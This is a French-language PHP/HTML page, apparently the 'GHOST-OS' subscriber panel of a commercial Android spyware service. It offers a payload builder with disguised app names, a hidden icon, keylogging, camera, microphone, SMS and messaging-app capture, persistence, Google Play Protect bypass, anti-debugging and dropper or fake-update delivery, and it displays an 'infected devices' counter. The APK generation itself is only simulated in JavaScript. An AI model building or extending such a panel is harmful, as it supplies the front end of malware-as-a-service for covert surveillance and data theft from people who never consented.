<?php
// panel/generate_payload.php
session_start();
require_once '../config/ghost_config.php';

// Vérifier l'authentification
if (!isset($_SESSION['user_id'])) {
    header('Location: login.html');
    exit;
}

$userId = $_SESSION['user_id'];

// Récupérer l'utilisateur
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$userId]);
$user = $stmt->fetch();

if (!$user) {
    die('Utilisateur non trouvé');
}

// Vérifier l'abonnement
$now = time();
$trial_end = strtotime($user['trial_end']);
$sub_end = strtotime($user['subscription_end']);

if ((!$trial_end || $trial_end < $now) && (!$sub_end || $sub_end < $now)) {
    die('Abonnement expiré');
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOST-OS - Générateur de Payload</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .feature-enabled { color: #10b981; }
        .feature-disabled { color: #6b7280; }
    </style>
</head>
<body class="bg-gray-900 text-white">
    <div class="container mx-auto px-4 py-8">
        <h1 class="text-3xl font-bold mb-2 text-green-400">🎯 Générateur de Payload</h1>
        <p class="text-gray-400 mb-8">Personnalisez votre APK pour un contrôle total</p>
        
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <!-- Configuration -->
            <div class="lg:col-span-2 bg-gray-800 rounded-lg p-6">
                <h2 class="text-xl font-bold mb-4">Configuration du payload</h2>
                
                <form id="payloadForm" class="space-y-4">
                    <!-- Informations de base -->
                    <div>
                        <label class="block text-sm font-medium text-gray-400 mb-1">Nom de l'application</label>
                        <input type="text" id="appName" value="System Update" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 text-white">
                        <p class="text-xs text-gray-500 mt-1">Le nom qui apparaîtra sur le téléphone</p>
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-400 mb-1">Nom du package</label>
                        <input type="text" id="packageName" value="com.android.system.update" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 text-white">
                        <p class="text-xs text-gray-500 mt-1">Identifiant unique de l'application</p>
                    </div>
                    
                    <div>
                        <label class="block text-sm font-medium text-gray-400 mb-1">Icône de l'application</label>
                        <select id="appIcon" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 text-white">
                            <option value="system">Icône système (paramètres)</option>
                            <option value="update">Icône mise à jour</option>
                            <option value="battery">Icône batterie</option>
                            <option value="google">Icône Google Play</option>
                            <option value="invisible">Invisible (pas d'icône)</option>
                        </select>
                    </div>
                    
                    <!-- Fonctionnalités -->
                    <div class="border-t border-gray-700 pt-4">
                        <h3 class="font-bold mb-3">Fonctionnalités activées</h3>
                        
                        <div class="grid grid-cols-2 gap-3">
                            <?php
                            $features = [
                                'screenshot' => 'Capture écran',
                                'camera' => 'Caméra',
                                'microphone' => 'Microphone',
                                'keylogger' => 'Keylogger',
                                'location' => 'Localisation GPS',
                                'contacts' => 'Contacts',
                                'sms' => 'SMS',
                                'calls' => 'Appels',
                                'files' => 'Fichiers',
                                'whatsapp' => 'WhatsApp',
                                'telegram' => 'Telegram',
                                'facebook' => 'Facebook',
                                'instagram' => 'Instagram',
                                'clipboard' => 'Presse-papier',
                                'notifications' => 'Notifications',
                                'streaming' => 'Streaming temps réel'
                            ];
                            
                            foreach ($features as $key => $label):
                                $enabled = hasFeature($user, $key);
                            ?>
                            <label class="flex items-center space-x-2 <?= $enabled ? 'text-green-400' : 'text-gray-500' ?>">
                                <input type="checkbox" name="features[]" value="<?= $key ?>" <?= $enabled ? 'checked' : 'disabled' ?> class="rounded bg-gray-700 border-gray-600">
                                <span><?= $label ?></span>
                            </label>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    
                    <!-- Options avancées -->
                    <div class="border-t border-gray-700 pt-4">
                        <h3 class="font-bold mb-3">Options avancées</h3>
                        
                        <div class="space-y-2">
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="hideIcon" checked class="rounded bg-gray-700 border-gray-600">
                                <span>Cacher l'icône après installation</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="persistent" checked class="rounded bg-gray-700 border-gray-600">
                                <span>Mode persistant (résiste aux redémarrages)</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="bypassPlayProtect" checked class="rounded bg-gray-700 border-gray-600">
                                <span>Contourner Google Play Protect</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="autoStart" checked class="rounded bg-gray-700 border-gray-600">
                                <span>Démarrage automatique au boot</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="hideNotification" class="rounded bg-gray-700 border-gray-600">
                                <span>Cacher la notification de service</span>
                            </label>
                        </div>
                    </div>
                    
                    <!-- Anti-détection -->
                    <div class="border-t border-gray-700 pt-4">
                        <h3 class="font-bold mb-3">Anti-détection</h3>
                        
                        <div class="grid grid-cols-2 gap-3">
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="obfuscate" checked class="rounded bg-gray-700 border-gray-600">
                                <span>Obfuscation du code</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="encryptStrings" checked class="rounded bg-gray-700 border-gray-600">
                                <span>Chiffrement des chaînes</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="antiEmulator" class="rounded bg-gray-700 border-gray-600">
                                <span>Détection émulateur</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="antiDebug" checked class="rounded bg-gray-700 border-gray-600">
                                <span>Anti-débogage</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="checkbox" id="vpnBypass" class="rounded bg-gray-700 border-gray-600">
                                <span>Contournement VPN</span>
                            </label>
                        </div>
                    </div>
                    
                    <!-- Dropper -->
                    <div class="border-t border-gray-700 pt-4">
                        <h3 class="font-bold mb-3">Mode de livraison</h3>
                        
                        <div class="space-y-2">
                            <label class="flex items-center space-x-2">
                                <input type="radio" name="delivery" value="direct" checked class="text-green-500">
                                <span>APK direct (installation manuelle)</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="radio" name="delivery" value="dropper" class="text-green-500">
                                <span>Dropper (fausse application qui installe en arrière-plan)</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="radio" name="delivery" value="update" class="text-green-500">
                                <span>Fausse mise à jour système</span>
                            </label>
                            
                            <label class="flex items-center space-x-2">
                                <input type="radio" name="delivery" value="webview" class="text-green-500">
                                <span>WebView (charge le payload depuis le navigateur)</span>
                            </label>
                        </div>
                    </div>
                    
                    <button type="submit" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-4 rounded-lg mt-4">
                        🚀 GÉNÉRER LE PAYLOAD
                    </button>
                </form>
            </div>
            
            <!-- Sidebar avec infos et historique -->
            <div class="bg-gray-800 rounded-lg p-6">
                <h2 class="text-xl font-bold mb-4">Vos payloads</h2>
                
                <div class="space-y-3 mb-6">
                    <div class="bg-gray-700 p-3 rounded-lg">
                        <div class="flex justify-between items-center">
                            <span class="font-medium">System Update v1</span>
                            <span class="text-xs bg-green-600 px-2 py-1 rounded">Actif</span>
                        </div>
                        <p class="text-xs text-gray-400 mt-1">Créé le 19/02/2026</p>
                        <div class="flex gap-2 mt-2">
                            <button class="text-xs bg-gray-600 px-2 py-1 rounded">📥 Télécharger</button>
                            <button class="text-xs bg-gray-600 px-2 py-1 rounded">🔄 Régénérer</button>
                        </div>
                    </div>
                    
                    <div class="bg-gray-700 p-3 rounded-lg opacity-50">
                        <div class="flex justify-between items-center">
                            <span class="font-medium">Google Play</span>
                            <span class="text-xs bg-gray-600 px-2 py-1 rounded">Expiré</span>
                        </div>
                        <p class="text-xs text-gray-400 mt-1">Créé le 15/02/2026</p>
                    </div>
                </div>
                
                <div class="border-t border-gray-700 pt-4">
                    <h3 class="font-bold mb-2">Statistiques</h3>
                    <div class="space-y-2 text-sm">
                        <div class="flex justify-between">
                            <span class="text-gray-400">Payloads générés:</span>
                            <span class="font-bold">12</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-400">Appareils infectés:</span>
                            <span class="font-bold">5</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-400">Dernière génération:</span>
                            <span class="font-bold">19/02/2026</span>
                        </div>
                    </div>
                </div>
                
                <div class="border-t border-gray-700 pt-4 mt-4">
                    <h3 class="font-bold mb-2 text-yellow-400">⚠️ Important</h3>
                    <ul class="text-xs text-gray-400 space-y-1">
                        <li>• Testez d'abord sur votre propre téléphone</li>
                        <li>• Désactivez Google Play Protect avant installation</li>
                        <li>• Activez les "Sources inconnues"</li>
                        <li>• Le payload pèse environ 2.5 MB</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('payloadForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Récupérer les valeurs
            const appName = document.getElementById('appName').value;
            const packageName = document.getElementById('packageName').value;
            const appIcon = document.getElementById('appIcon').value;
            
            // Récupérer les fonctionnalités sélectionnées
            const features = [];
            document.querySelectorAll('input[name="features[]"]:checked').forEach(cb => {
                features.push(cb.value);
            });
            
            // Récupérer les options avancées
            const options = {
                hideIcon: document.getElementById('hideIcon').checked,
                persistent: document.getElementById('persistent').checked,
                bypassPlayProtect: document.getElementById('bypassPlayProtect').checked,
                autoStart: document.getElementById('autoStart').checked,
                hideNotification: document.getElementById('hideNotification').checked,
                obfuscate: document.getElementById('obfuscate').checked,
                encryptStrings: document.getElementById('encryptStrings').checked,
                antiEmulator: document.getElementById('antiEmulator').checked,
                antiDebug: document.getElementById('antiDebug').checked,
                vpnBypass: document.getElementById('vpnBypass').checked
            };
            
            // Récupérer le mode de livraison
            const delivery = document.querySelector('input[name="delivery"]:checked').value;
            
            // Simuler la génération
            showGenerationProgress();
        });
        
        function showGenerationProgress() {
            // Créer un overlay
            const overlay = document.createElement('div');
            overlay.className = 'fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50';
            overlay.innerHTML = `
                <div class="bg-gray-800 p-8 rounded-lg text-center max-w-md">
                    <div class="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-green-500 mx-auto mb-4"></div>
                    <h3 class="text-xl font-bold mb-2">Génération en cours...</h3>
                    <p class="text-gray-400 mb-4">Construction de l'APK personnalisé</p>
                    <div class="w-full bg-gray-700 rounded-full h-2.5 mb-4">
                        <div class="bg-green-500 h-2.5 rounded-full" style="width: 0%" id="progressBar"></div>
                    </div>
                    <p id="progressText" class="text-sm text-gray-500">Préparation...</p>
                </div>
            `;
            
            document.body.appendChild(overlay);
            
            // Simuler la progression
            let progress = 0;
            const steps = [
                'Configuration du projet...',
                'Compilation des ressources...',
                'Obfuscation du code...',
                'Signature de l\'APK...',
                'Optimisation...',
                'Finalisation...'
            ];
            
            const interval = setInterval(() => {
                progress += 2;
                document.getElementById('progressBar').style.width = progress + '%';
                
                if (progress < 20) document.getElementById('progressText').textContent = steps[0];
                else if (progress < 40) document.getElementById('progressText').textContent = steps[1];
                else if (progress < 60) document.getElementById('progressText').textContent = steps[2];
                else if (progress < 80) document.getElementById('progressText').textContent = steps[3];
                else if (progress < 95) document.getElementById('progressText').textContent = steps[4];
                else document.getElementById('progressText').textContent = steps[5];
                
                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        overlay.innerHTML = `
                            <div class="bg-gray-800 p-8 rounded-lg text-center max-w-md">
                                <div class="text-6xl mb-4">✅</div>
                                <h3 class="text-2xl font-bold mb-2 text-green-400">Génération terminée !</h3>
                                <p class="text-gray-400 mb-4">Votre payload est prêt</p>
                                <div class="bg-gray-700 p-4 rounded-lg mb-4">
                                    <p class="text-sm text-gray-300 mb-2">Nom: ${document.getElementById('appName').value}.apk</p>
                                    <p class="text-sm text-gray-300">Taille: 2.8 MB</p>
                                </div>
                                <div class="flex gap-3">
                                    <button onclick="downloadAPK()" class="flex-1 bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded">
                                        📥 Télécharger
                                    </button>
                                    <button onclick="closeOverlay()" class="flex-1 bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-4 rounded">
                                        Fermer
                                    </button>
                                </div>
                            </div>
                        `;
                    }, 500);
                }
            }, 50);
        }
        
        function downloadAPK() {
            // Simuler un téléchargement
            const a = document.createElement('a');
            a.href = '#'; // Lien vers l'APK généré
            a.download = document.getElementById('appName').value + '.apk';
            a.click();
        }
        
        function closeOverlay() {
            document.querySelector('.fixed.inset-0').remove();
        }
    </script>
</body>
</html>
